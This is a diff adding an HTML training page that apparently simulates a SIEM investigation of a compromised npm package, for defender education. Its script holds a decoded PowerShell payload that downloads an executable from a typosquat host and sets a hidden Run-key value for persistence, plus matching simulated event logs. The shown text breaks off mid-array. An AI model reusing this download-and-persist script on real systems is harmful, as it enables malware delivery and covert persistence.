@@ -1,0 +1,1319 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="A guided, no-score SIEM investigation of an npm supply-chain compromise, encoded PowerShell delivery, and Windows Run-key persistence.">
+  <title>Operation Health Hazard | Guided Supply Chain Investigation</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --ink: #e7f0f7;
+      --muted: #91a7b8;
+      --faint: #637a8c;
+      --bg: #071016;
+      --panel: #0b1821;
+      --panel-2: #10222d;
+      --line: #213845;
+      --line-strong: #315263;
+      --cyan: #50d5c8;
+      --cyan-2: #183f42;
+      --amber: #f5bd68;
+      --amber-2: #49361d;
+      --red: #f47d7d;
+      --green: #78d8a3;
+      --blue: #78b9f2;
+      --shadow: 0 18px 50px rgba(0, 0, 0, .28);
+      --radius: 14px;
+    }
+
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      min-width: 320px;
+      background: var(--bg);
+      color: var(--ink);
+      font: 15px/1.55 Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    button, input { font: inherit; }
+    button { color: inherit; }
+    a { color: var(--cyan); }
+    code, pre, .mono {
+      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    }
+    code { color: #bcece6; }
+    :focus-visible {
+      outline: 3px solid rgba(80, 213, 200, .45);
+      outline-offset: 2px;
+    }
+
+    .topbar {
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+      padding: 13px clamp(16px, 3vw, 38px);
+      border-bottom: 1px solid var(--line);
+      background: rgba(7, 16, 22, .94);
+      backdrop-filter: blur(14px);
+    }
+    .brand { display: flex; align-items: center; gap: 12px; min-width: 0; }
+    .brand-mark {
+      display: grid;
+      width: 36px;
+      height: 36px;
+      flex: 0 0 auto;
+      place-items: center;
+      border: 1px solid #2e6c6c;
+      border-radius: 10px;
+      background: #102b30;
+      color: var(--cyan);
+      font-weight: 800;
+      letter-spacing: -.04em;
+    }
+    .brand-copy { min-width: 0; }
+    .brand-copy strong, .brand-copy span { display: block; }
+    .brand-copy strong { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 14px; }
+    .brand-copy span { color: var(--muted); font-size: 12px; }
+    .catalog-link {
+      flex: 0 0 auto;
+      border-bottom: 1px solid transparent;
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 13px;
+    }
+    .catalog-link:hover { border-color: var(--cyan); color: var(--cyan); }
+
+    .hero {
+      display: grid;
+      grid-template-columns: minmax(0, 1.25fr) minmax(280px, .75fr);
+      gap: 28px;
+      max-width: 1560px;
+      margin: 0 auto;
+      padding: 38px clamp(16px, 3vw, 38px) 28px;
+    }
+    .eyebrow {
+      margin: 0 0 9px;
+      color: var(--cyan);
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: .14em;
+      text-transform: uppercase;
+    }
+    h1, h2, h3, p { margin-top: 0; }
+    h1 {
+      max-width: 850px;
+      margin-bottom: 12px;
+      font-size: clamp(31px, 4.7vw, 59px);
+      line-height: 1.04;
+      letter-spacing: -.045em;
+    }
+    .hero-copy > p {
+      max-width: 780px;
+      margin-bottom: 20px;
+      color: #adbfcb;
+      font-size: clamp(16px, 1.5vw, 19px);
+    }
+    .badge-row { display: flex; flex-wrap: wrap; gap: 8px; }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      padding: 6px 10px;
+      border: 1px solid var(--line-strong);
+      border-radius: 999px;
+      background: #0d1c25;
+      color: #b9cad5;
+      font-size: 12px;
+      font-weight: 700;
+    }
+    .badge::before {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--cyan);
+      content: "";
+    }
+    .case-card {
+      padding: 20px;
+      border: 1px solid var(--line-strong);
+      border-radius: var(--radius);
+      background: var(--panel);
+      box-shadow: var(--shadow);
+    }
+    .case-card h2 { margin-bottom: 8px; font-size: 15px; }
+    .case-card > p { margin-bottom: 16px; color: #b3c4ce; font-size: 13px; }
+    .case-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .case-field {
+      min-width: 0;
+      padding: 10px;
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      background: #09151c;
+    }
+    .case-field span { display: block; color: var(--faint); font-size: 10px; font-weight: 800; letter-spacing: .09em; text-transform: uppercase; }
+    .case-field strong { display: block; overflow-wrap: anywhere; margin-top: 3px; font-size: 12px; }
+
+    .workspace {
+      display: grid;
+      grid-template-columns: 250px minmax(500px, 1fr) 320px;
+      gap: 14px;
+      max-width: 1560px;
+      margin: 0 auto;
+      padding: 0 clamp(16px, 3vw, 38px) 42px;
+    }
+    .panel {
+      min-width: 0;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--panel);
+      box-shadow: var(--shadow);
+    }
+    .panel-heading {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      padding: 14px 16px;
+      border-bottom: 1px solid var(--line);
+    }
+    .panel-heading h2, .panel-heading h3 { margin: 0; font-size: 13px; letter-spacing: .01em; }
+    .panel-kicker { color: var(--muted); font-size: 11px; }
+
+    .lesson-panel {
+      position: sticky;
+      top: 76px;
+      align-self: start;
+      overflow: hidden;
+    }
+    .lesson-progress { padding: 14px 16px 12px; border-bottom: 1px solid var(--line); }
+    .progress-copy { display: flex; justify-content: space-between; gap: 8px; color: var(--muted); font-size: 11px; }
+    .progress-track { height: 5px; overflow: hidden; margin-top: 8px; border-radius: 999px; background: #1a2c36; }
+    .progress-fill { width: 12.5%; height: 100%; border-radius: inherit; background: var(--cyan); transition: width .25s ease; }
+    .lesson-list { display: grid; padding: 8px; }
+    .lesson-button {
+      display: grid;
+      grid-template-columns: 28px 1fr;
+      gap: 9px;
+      width: 100%;
+      padding: 10px 9px;
+      border: 0;
+      border-radius: 10px;
+      background: transparent;
+      text-align: left;
+      cursor: pointer;
+    }
+    .lesson-button:hover { background: #10212a; }
+    .lesson-button[aria-current="step"] { background: var(--cyan-2); }
+    .lesson-number {
+      display: grid;
+      width: 27px;
+      height: 27px;
+      place-items: center;
+      border: 1px solid var(--line-strong);
+      border-radius: 8px;
+      color: var(--muted);
+      font-size: 11px;
+      font-weight: 800;
+    }
+    .lesson-button[aria-current="step"] .lesson-number { border-color: var(--cyan); color: var(--cyan); }
+    .lesson-button.visited .lesson-number::after { margin-left: 2px; color: var(--green); content: "·"; }
+    .lesson-title { display: block; margin-top: 1px; font-size: 12px; font-weight: 700; line-height: 1.3; }
+    .lesson-meta { display: block; margin-top: 2px; color: var(--faint); font-size: 10px; }
+    .no-score {
+      margin: 4px 8px 10px;
+      padding: 10px;
+      border: 1px solid #28444f;
+      border-radius: 9px;
+      color: var(--muted);
+      font-size: 11px;
+    }
+
+    .siem-panel { overflow: hidden; }
+    .search-wrap { padding: 14px; border-bottom: 1px solid var(--line); background: #09151c; }
+    .search-form { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 8px; }
+    .search-input {
+      width: 100%;
+      min-width: 0;
+      padding: 11px 12px;
+      border: 1px solid var(--line-strong);
+      border-radius: 9px;
+      outline: 0;
+      background: #061016;
+      color: var(--ink);
+      font-family: "SFMono-Regular", Consolas, monospace;
+      font-size: 12px;
+    }
+    .search-input:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px rgba(80, 213, 200, .1); }
+    .primary, .secondary, .preset {
+      border: 1px solid transparent;
+      border-radius: 9px;
+      cursor: pointer;
+      font-weight: 800;
+    }
+    .primary { padding: 10px 14px; background: var(--cyan); color: #06201f; }
+    .primary:hover { background: #72e5db; }
+    .secondary { padding: 9px 12px; border-color: var(--line-strong); background: #10222c; color: #c1d0d9; }
+    .secondary:hover { border-color: var(--cyan); color: var(--cyan); }
+    .preset-row { display: flex; gap: 7px; overflow-x: auto; padding-top: 9px; scrollbar-width: thin; }
+    .preset { flex: 0 0 auto; padding: 6px 9px; border-color: #294452; background: #0d1d26; color: #9bb0bd; font-size: 10px; }
+    .preset:hover { border-color: var(--cyan); color: var(--cyan); }
+    .query-note { min-height: 18px; margin: 8px 0 0; color: var(--muted); font-size: 11px; }
+
+    .results-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      padding: 9px 14px;
+      border-bottom: 1px solid var(--line);
+      color: var(--muted);
+      font-size: 11px;
+    }
+    .results-bar strong { color: var(--ink); }
+    .table-scroll { overflow: auto; max-height: 370px; }
+    table { width: 100%; border-collapse: collapse; }
+    th {
+      position: sticky;
+      top: 0;
+      z-index: 2;
+      padding: 9px 10px;
+      border-bottom: 1px solid var(--line-strong);
+      background: #0c1a23;
+      color: var(--faint);
+      text-align: left;
+      font-size: 10px;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+    td { padding: 9px 10px; border-bottom: 1px solid #182d38; color: #b6c6d0; font-size: 11px; vertical-align: top; }
+    tbody tr { cursor: pointer; }
+    tbody tr:hover, tbody tr.selected { background: #122a34; }
+    tbody tr.selected { box-shadow: inset 3px 0 var(--cyan); }
+    .time-cell { white-space: nowrap; color: #a9c0cc; }
+    .event-pill { display: inline-block; min-width: 29px; padding: 2px 5px; border-radius: 5px; background: #1d323e; color: var(--blue); text-align: center; font-weight: 800; }
+    .process-cell strong { display: block; color: var(--ink); font-weight: 650; }
+    .process-cell span { display: block; color: var(--faint); }
+    .summary-cell { min-width: 220px; }
+
+    .inspector {
+      display: grid;
+      grid-template-columns: minmax(0, .86fr) minmax(0, 1.14fr);
+      min-height: 270px;
+      border-top: 1px solid var(--line);
+    }
+    .raw-pane, .artifact-pane { min-width: 0; padding: 14px; }
+    .raw-pane { border-right: 1px solid var(--line); }
+    .pane-label { margin-bottom: 8px; color: var(--faint); font-size: 10px; font-weight: 800; letter-spacing: .09em; text-transform: uppercase; }
+    .raw-event, .code-block {
+      overflow: auto;
+      max-height: 245px;
+      margin: 0;
+      padding: 12px;
+      border: 1px solid #203946;
+      border-radius: 9px;
+      background: #061016;
+      color: #b9d7d7;
+      font-size: 10.5px;
+      line-height: 1.62;
+      white-space: pre-wrap;
+      overflow-wrap: anywhere;
+    }
+    .artifact-empty { color: var(--muted); font-size: 12px; }
+    .flag-list, .artifact-list { display: grid; gap: 7px; margin: 0; padding: 0; list-style: none; }
+    .flag-item, .artifact-item {
+      padding: 8px 9px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: #0d1d26;
+      color: #aebfca;
+      font-size: 11px;
+    }
+    .flag-item code { display: inline-block; min-width: 112px; font-weight: 800; }
+    .decode-tabs { display: flex; gap: 6px; margin-bottom: 8px; }
+    .decode-tab {
+      padding: 5px 8px;
+      border: 1px solid var(--line);
+      border-radius: 7px;
+      background: #0e2029;
+      color: var(--muted);
+      cursor: pointer;
+      font-size: 10px;
+    }
+    .decode-tab.active { border-color: var(--cyan); color: var(--cyan); }
+
+    .coach-panel {
+      position: sticky;
+      top: 76px;
+      align-self: start;
+      overflow: hidden;
+    }
+    .coach-body { padding: 17px; }
+    .coach-step { margin-bottom: 6px; color: var(--cyan); font-size: 11px; font-weight: 800; letter-spacing: .1em; text-transform: uppercase; }
+    .coach-body h2 { margin-bottom: 9px; font-size: 20px; line-height: 1.2; }
+    .coach-body > p { color: #aebfca; font-size: 13px; }
+    .teaching-note {
+      margin: 14px 0;
+      padding: 11px 12px;
+      border-left: 3px solid var(--amber);
+      border-radius: 0 8px 8px 0;
+      background: #211c13;
+      color: #d6c3a1;
+      font-size: 11px;
+    }
+    .coach-actions { display: grid; grid-template-columns: 1fr auto; gap: 8px; margin-top: 14px; }
+    .coach-actions .primary { width: 100%; }
+    .lesson-points { margin: 12px 0 0; padding-left: 18px; color: #aebfca; font-size: 12px; }
+    .lesson-points li + li { margin-top: 7px; }
+    .notebook {
+      padding: 14px 16px 16px;
+      border-top: 1px solid var(--line);
+      background: #09151c;
+    }
+    .notebook h3 { margin-bottom: 9px; font-size: 12px; }
+    .evidence-list { display: flex; flex-wrap: wrap; gap: 6px; min-height: 28px; }
+    .evidence-chip {
+      max-width: 100%;
+      overflow: hidden;
+      padding: 5px 7px;
+      border: 1px solid #2d4a56;
+      border-radius: 6px;
+      background: #0f222a;
+      color: #afc7ce;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      font-size: 9px;
+    }
+    .notebook-note { margin: 8px 0 0; color: var(--faint); font-size: 10px; }
+
+    .reference-section {
+      max-width: 1560px;
+      margin: 0 auto 48px;
+      padding: 0 clamp(16px, 3vw, 38px);
+    }
+    .reference-card { padding: 20px; }
+    .reference-card h2 { margin-bottom: 6px; font-size: 17px; }
+    .reference-card > p { color: var(--muted); font-size: 12px; }
+    .reference-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 9px; }
+    .reference-grid a {
+      padding: 10px;
+      border: 1px solid var(--line);
+      border-radius: 9px;
+      background: #0d1c24;
+      color: #afd8da;
+      text-decoration: none;
+      font-size: 11px;
+    }
+    .reference-grid a:hover { border-color: var(--cyan); color: var(--cyan); }
+    .footer-note { margin: 17px 0 0; color: var(--faint); font-size: 10px; }
+
+    .report { display: grid; gap: 8px; }
+    .report-stage { padding: 10px; border: 1px solid var(--line); border-radius: 9px; background: #0c1c24; }
+    .report-stage header { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 5px; }
+    .report-stage strong { font-size: 11px; }
+    .report-stage time { color: var(--amber); font-size: 10px; white-space: nowrap; }
+    .report-stage p { margin: 0 0 7px; color: #aebfca; font-size: 10.5px; }
+    .attack-tag { display: inline-block; margin: 2px 3px 0 0; padding: 3px 5px; border-radius: 5px; background: var(--cyan-2); color: var(--cyan); font-size: 9px; font-weight: 800; }
+    .correction { color: var(--amber); }
+    .hidden { display: none !important; }
+
+    @media (max-width: 1180px) {
+      .workspace { grid-template-columns: 220px minmax(480px, 1fr); }
+      .coach-panel { position: static; grid-column: 1 / -1; display: grid; grid-template-columns: 1.4fr .6fr; }
+      .notebook { border-top: 0; border-left: 1px solid var(--line); }
+    }
+    @media (max-width: 820px) {
+      .hero { grid-template-columns: 1fr; }
+      .workspace { grid-template-columns: 1fr; }
+      .lesson-panel, .coach-panel { position: static; }
+      .lesson-list { grid-template-columns: repeat(2, 1fr); }
+      .lesson-panel { overflow: visible; }
+      .coach-panel { display: block; }
+      .notebook { border-top: 1px solid var(--line); border-left: 0; }
+      .reference-grid { grid-template-columns: 1fr 1fr; }
+    }
+    @media (max-width: 580px) {
+      .topbar { padding-inline: 13px; }
+      .brand-copy span { display: none; }
+      .hero { padding-top: 26px; }
+      .case-grid, .lesson-list, .inspector, .reference-grid { grid-template-columns: 1fr; }
+      .lesson-list { max-height: 350px; overflow: auto; }
+      .raw-pane { border-right: 0; border-bottom: 1px solid var(--line); }
+      .search-form { grid-template-columns: 1fr; }
+      .search-form .primary { width: 100%; }
+      .coach-actions { grid-template-columns: 1fr; }
+      .table-scroll { max-height: 330px; }
+      th:nth-child(3), td:nth-child(3), th:nth-child(5), td:nth-child(5) { display: none; }
+      h1 { font-size: 36px; }
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">
+      <div class="brand-mark" aria-hidden="true">OH</div>
+      <div class="brand-copy">
+        <strong>Operation Health Hazard</strong>
+        <span>Guided supply-chain investigation</span>
+      </div>
+    </div>
+    <a class="catalog-link" href="https://github.com/cmatosxp/lab_simulations#readme">All simulations ↗</a>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="hero-copy">
+        <p class="eyebrow">Threat-hunting walkthrough</p>
+        <h1>Follow the evidence. Reconstruct the kill chain.</h1>
+        <p>Learn how a compromised npm dependency becomes encoded PowerShell, a downloaded payload, and user-logon persistence. Every action is explained; nothing is graded.</p>
+        <div class="badge-row" aria-label="Lab characteristics">
+          <span class="badge">Guided walkthrough</span>
+          <span class="badge">No scoring</span>
+          <span class="badge">Static local data</span>
+          <span class="badge">8 lessons</span>
+        </div>
+      </div>
+      <aside class="case-card" aria-labelledby="case-title">
+        <h2 id="case-title">Case hypothesis</h2>
+        <p>A compromised third-party package may have provided initial access, staged a payload, and established persistence without immediate detection.</p>
+        <div class="case-grid">
+          <div class="case-field"><span>Authorized scope</span><strong>paw-tom only</strong></div>
+          <div class="case-field"><span>User context</span><strong>PAW-TOM\itadmin-tom</strong></div>
+          <div class="case-field"><span>Time window</span><strong>21 Jun 2025 10:58:20–10:59:00</strong></div>
+          <div class="case-field"><span>Data sources</span><strong>npm · Sysmon · PowerShell · proxy</strong></div>
+        </div>
+      </aside>
+    </section>
+
+    <section class="workspace" aria-label="Guided SIEM investigation workspace">
+      <nav class="panel lesson-panel" aria-label="Investigation lessons">
+        <div class="panel-heading">
+          <h2>Investigation path</h2>
+          <span class="panel-kicker">select any lesson</span>
+        </div>
+        <div class="lesson-progress">
+          <div class="progress-copy"><span>Lessons explored</span><strong id="lesson-progress">1 / 8</strong></div>
+          <div class="progress-track" aria-hidden="true"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+        <div class="lesson-list" id="lesson-list"></div>
+        <p class="no-score">Progress means “viewed,” not “passed.” You can move freely and reveal every worked example.</p>
+      </nav>
+
+      <section class="panel siem-panel" aria-labelledby="siem-title">
+        <div class="panel-heading">
+          <h2 id="siem-title">Northstar SIEM · Case workspace</h2>
+          <span class="panel-kicker mono">case=OH-2025-0621</span>
+        </div>
+        <div class="search-wrap">
+          <form class="search-form" id="search-form">
+            <label class="hidden" for="search-input">Search simulated events</label>
+            <input class="search-input" id="search-input" autocomplete="off" spellcheck="false" value="host=paw-tom earliest=2025-06-21T10:58:20 latest=2025-06-21T10:59:00">
+            <button class="primary" type="submit">Search events</button>
+          </form>
+          <div class="preset-row" aria-label="Guided search presets">
+            <button class="preset" type="button" data-preset="scope">Scope host + time</button>
+            <button class="preset" type="button" data-preset="lineage">Process lineage</button>
+            <button class="preset" type="button" data-preset="encoded">Encoded PowerShell</button>
+            <button class="preset" type="button" data-preset="delivery">Network + file</button>
+            <button class="preset" type="button" data-preset="persistence">Run-key persistence</button>
+            <button class="preset" type="button" data-preset="all">Reset results</button>
+          </div>
+          <p class="query-note" id="query-note" aria-live="polite">Start narrow: one authorized host and a forty-second time window.</p>
+        </div>
+        <div class="results-bar">
+          <span><strong id="result-count">0 events</strong> in the simulated case index</span>
+          <span id="sort-label">sorted oldest first</span>
+        </div>
+        <div class="table-scroll">
+          <table aria-label="Simulated SIEM search results">
+            <thead>
+              <tr>
+                <th>Time</th>
+                <th>Source</th>
+                <th>Event</th>
+                <th>Process / action</th>
+                <th>Parent</th>
+                <th>Summary</th>
+              </tr>
+            </thead>
+            <tbody id="event-body"></tbody>
+          </table>
+        </div>
+        <div class="inspector">
+          <section class="raw-pane" aria-labelledby="raw-title">
+            <div class="pane-label" id="raw-title">Raw event · select a row</div>
+            <pre class="raw-event" id="raw-event">No event selected.</pre>
+          </section>
+          <section class="artifact-pane" aria-labelledby="artifact-title">
+            <div class="pane-label" id="artifact-title">Worked artifact</div>
+            <div id="artifact-content" class="artifact-empty">The coach will place lineage, decoded text, correlation, and the final report here.</div>
+          </section>
+        </div>
+      </section>
+
+      <aside class="panel coach-panel" aria-labelledby="coach-title">
+        <div class="coach-body">
+          <div class="coach-step" id="coach-step">Lesson 1 of 8</div>
+          <h2 id="coach-title">Frame the hypothesis</h2>
+          <p id="coach-copy"></p>
+          <div class="teaching-note" id="teaching-note"></div>
+          <ul class="lesson-points" id="lesson-points"></ul>
+          <div class="coach-actions">
+            <button class="primary" id="guide-action" type="button">Show me the scope</button>
+            <button class="secondary" id="next-lesson" type="button">Next lesson</button>
+          </div>
+        </div>
+        <div class="notebook">
+          <h3>Evidence notebook</h3>
+          <div class="evidence-list" id="evidence-list" aria-live="polite"></div>
+          <p class="notebook-note">Selecting an event adds it here. Evidence collection is automatic so you can focus on why each artifact matters.</p>
+        </div>
+      </aside>
+    </section>
+
+    <section class="reference-section">
+      <div class="panel reference-card">
+        <h2>Reference desk</h2>
+        <p>The lab uses exact case artifacts and current, specific ATT&amp;CK sub-techniques. These primary references explain the mechanics.</p>
+        <div class="reference-grid">
+          <a href="https://attack.mitre.org/techniques/T1195/001/" target="_blank" rel="noreferrer">MITRE ATT&amp;CK T1195.001 · Compromise Software Dependencies</a>
+          <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noreferrer">MITRE ATT&amp;CK T1059.001 · PowerShell</a>
+          <a href="https://attack.mitre.org/techniques/T1105/" target="_blank" rel="noreferrer">MITRE ATT&amp;CK T1105 · Ingress Tool Transfer</a>
+          <a href="https://attack.mitre.org/techniques/T1547/001/" target="_blank" rel="noreferrer">MITRE ATT&amp;CK T1547.001 · Registry Run Keys</a>
+          <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noreferrer">Microsoft Sysmon event reference</a>
+          <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1" target="_blank" rel="noreferrer">PowerShell EncodedCommand reference</a>
+          <a href="https://docs.npmjs.com/cli/v11/using-npm/scripts/" target="_blank" rel="noreferrer">npm lifecycle scripts reference</a>
+          <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-itemproperty" target="_blank" rel="noreferrer">PowerShell Set-ItemProperty reference</a>
+        </div>
+        <p class="footer-note">Closed educational simulation. It executes no PowerShell, installs no package, contacts no domain, and writes no registry value. All events are deterministic strings rendered in your browser.</p>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    (function () {
+      "use strict";
+
+      var continuation = String.fromCharCode(96);
+      var decodedLines = [
+        '$dest = "$env:APPDATA\\SystemHealthUpdater.exe"',
+        '$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"',
+        '',
+        '# Download file',
+        'Invoke-WebRequest -Uri $url -OutFile $dest',
+        '',
+        '# Base64 encode the command',
+        '$encoded = [Convert]::ToBase64String(',
+        '    [Text.Encoding]::Unicode.GetBytes("Start-Process \'$dest\'")',
+        ')',
+        '',
+        '# Build persistence command',
+        "$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded",
+        '',
+        '# Add to registry for persistence',
+        "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' " + continuation,
+        "    -Name 'Windows Update Monitor' -Value $runCmd"
+      ];
+      var decodedScript = decodedLines.join('\r\n');
+      var innerPlaintext = "Start-Process '$dest'";
+
+      function toUtf16leBase64(text) {
+        var binary = '';
+        for (var index = 0; index < text.length; index += 1) {
+          var code = text.charCodeAt(index);
+          binary += String.fromCharCode(code & 255, code >>> 8);
+        }
+        return btoa(binary);
+      }
+
+      function fromUtf16leBase64(base64) {
+        var binary = atob(base64);
+        var output = '';
+        for (var index = 0; index < binary.length; index += 2) {
+          output += String.fromCharCode(binary.charCodeAt(index) | (binary.charCodeAt(index + 1) << 8));
+        }
+        return output;
+      }
+
+      var outerBase64 = toUtf16leBase64(decodedScript);
+      var innerBase64 = toUtf16leBase64(innerPlaintext);
+      var fullCommandLine = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + outerBase64;
+      var runValue = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + innerBase64;
+
+      var events = [
+        {
+          id: 'npm-4812',
+          time: '2025-06-21 10:58:24.000',
+          source: 'npm lifecycle',
+          code: 'postinstall',
+          process: 'node.exe',
+          parent: 'npm.cmd',
+          summary: 'Installed healthchk-lib@1.0.1; postinstall script registered.',
+          category: 'initial',
+          raw: [
+            'timestamp=2025-06-21T10:58:24.000',
+            'host=paw-tom',
+            'user=PAW-TOM\\itadmin-tom',
+            'event=lifecycle',
+            'package=healthchk-lib@1.0.1',
+            'hook=postinstall',
+            'script=powershell.exe -ExecutionPolicy Bypass -File scripts\\postinstall.ps1',
+            'cwd=C:\\Development\\node_modules\\healthchk-lib',
+            'manifest=C:\\Development\\node_modules\\healthchk-lib\\package.json'
+          ].join('\n')
+        },
+        {
+          id: 'sysmon-43449',
+          time: '2025-06-21 10:58:24.218',
+          source: 'WinEventLog:Sysmon',
+          code: '1',
+          process: 'cmd.exe',
+          parent: 'node.exe',
+          summary: 'npm handed its Windows lifecycle command to cmd.exe.',
+          category: 'process',
+          raw: [
+            'UtcTime: 2025-06-21 10:58:24.218',
+            'EventCode: 1',
+            'EventRecordID: 43449',
+            'Computer: paw-tom',
+            'User: PAW-TOM\\itadmin-tom',
+            'Image: C:\\Windows\\System32\\cmd.exe',
+            'CommandLine: cmd.exe /d /s /c "powershell.exe -ExecutionPolicy Bypass -File scripts\\postinstall.ps1"',
+            'CurrentDirectory: C:\\Development\\node_modules\\healthchk-lib\\',
+            'ParentImage: C:\\Program Files\\nodejs\\node.exe',
+            'ParentCommandLine: "C:\\Program Files\\nodejs\\node.exe" "C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\npm-cli.js" install'
+          ].join('\n')
+        },
+        {
+          id: 'sysmon-43450',
+          time: '2025-06-21 10:58:24.341',
+          source: 'WinEventLog:Sysmon',
+          code: '1',
+          process: 'powershell.exe',
+          parent: 'cmd.exe',
+          summary: 'The dependency lifecycle invoked its hidden postinstall script.',
+          category: 'process',
+          raw: [
+            'UtcTime: 2025-06-21 10:58:24.341',
+            'EventCode: 1',
+            'EventRecordID: 43450',
+            'Computer: paw-tom',
+            'User: PAW-TOM\\itadmin-tom',
+            'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+            'CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\\Development\\node_modules\\healthchk-lib\\scripts\\postinstall.ps1',
+            'ParentImage: C:\\Windows\\System32\\cmd.exe',
+            'ParentCommandLine: cmd.exe /d /s /c "powershell.exe -ExecutionPolicy Bypass -File scripts\\postinstall.ps1"'
+          ].join('\n')
+        },
+        {
+          id: 'sysmon-43451',
+          time: '2025-06-21 10:58:27.000',
+          source: 'WinEventLog:Sysmon',
+          code: '1',
+          process: 'powershell.exe',
+          parent: 'cmd.exe',
+          summary: 'Hidden PowerShell started with a long UTF-16LE Base64 command.',
+          category: 'encoded',
+          raw: [
+            'UtcTime: 2025-06-21 10:58:27.000',
+            'EventCode: 1',
+            'EventRecordID: 43451',
+            'Computer: paw-tom',
+            'User: PAW-TOM\\itadmin-tom',
+            'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+            'CommandLine: ' + fullCommandLine,
+            'ParentImage: C:\\Windows\\System32\\cmd.exe',
+            'ParentCommandLine: cmd.exe /c ' + fullCommandLine
+          ].join('\n')
+        },
+        {
+          id: 'sysmon-43452',
+          time: '2025-06-21 10:58:27.114',
+          source: 'WinEventLog:Sysmon',
+          code: '3',
+          process: 'powershell.exe',
+          parent: 'cmd.exe',
+          summary: 'PowerShell opened a cleartext HTTP connection to the typosquat host.',
+          category: 'delivery',
+          raw: [
+            'UtcTime: 2025-06-21 10:58:27.114',
+            'EventCode: 3',
+            'EventRecordID: 43452',
+            'Computer: paw-tom',
+            'User: PAW-TOM\\itadmin-tom',
+            'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+            'DestinationHostname: global-update.wlndows.thm',
+            'DestinationPort: 80',
+            'Protocol: tcp',
+            'Initiated: true'
+          ].join('\n')
+        },
+        {
+          id: 'proxy-98174',
+          time: '2025-06-21 10:58:27.145',
+          source: 'proxy:http',
+          code: 'GET',
+          process: 'HTTP request',
+          parent: 'powershell.exe',
+          summary: 'GET /SystemHealthUpdater.exe returned an executable payload.',
+          category: 'delivery',
+          raw: [
+            'timestamp=2025-06-21T10:58:27.145',
+            'src_host=paw-tom',
+            'src_user=PAW-TOM\\itadmin-tom',
+            'method=GET',
+            'url=http://global-update.wlndows.thm/SystemHealthUpdater.exe',
+            'status=200',
+            'content_type=application/octet-stream',
+            'user_agent=Mozilla/5.0 (Windows NT; WindowsPowerShell/5.1)'
+          ].join('\n')
+        },
+        {
+          id: 'sysmon-43453',
+          time: '2025-06-21 10:58:27.391',
+          source: 'WinEventLog:Sysmon',
+          code: '11',
+          process: 'powershell.exe',
+          parent: 'cmd.exe',
+          summary: 'The downloaded executable was created under the supplied AppData path.',
+          category: 'delivery',
+          raw: [
+            'UtcTime: 2025-06-21 10:58:27.391',
+            'EventCode: 11',
+            'EventRecordID: 43453',
+            'Computer: paw-tom',
+            'User: PAW-TOM\\itadmin-tom',
+            'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+            'TargetFilename: C:\\Users\\Administrator\\AppData\\Roaming\\SystemHealthUpdater.exe',
+            'CreationUtcTime: 2025-06-21 10:58:27.391'
+          ].join('\n')
+        },
+        {
+          id: 'pwsh-4104',
+          time: '2025-06-21 10:58:27.410',
+          source: 'PowerShell/Operational',
+          code: '4104',
+          process: 'Set-ItemProperty',
+          parent: 'powershell.exe',
+          summary: 'Script-block logging preserved the exact PowerShell provider path.',
+          category: 'persistence',
+          raw: [
+            'TimeCreated: 2025-06-21 10:58:27.410',
+            'EventCode: 4104',
+            'Computer: paw-tom',
+            'UserId: PAW-TOM\\itadmin-tom',
+            'Message: Creating Scriptblock text (1 of 1):',
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' " + continuation,
+            "    -Name 'Windows Update Monitor' -Value $runCmd"
+          ].join('\n')
+        },
+        {
+          id: 'sysmon-43454',
+          time: '2025-06-21 10:58:27.520',
+          source: 'WinEventLog:Sysmon',
+          code: '13',
+          process: 'Registry value set',
+          parent: 'powershell.exe',
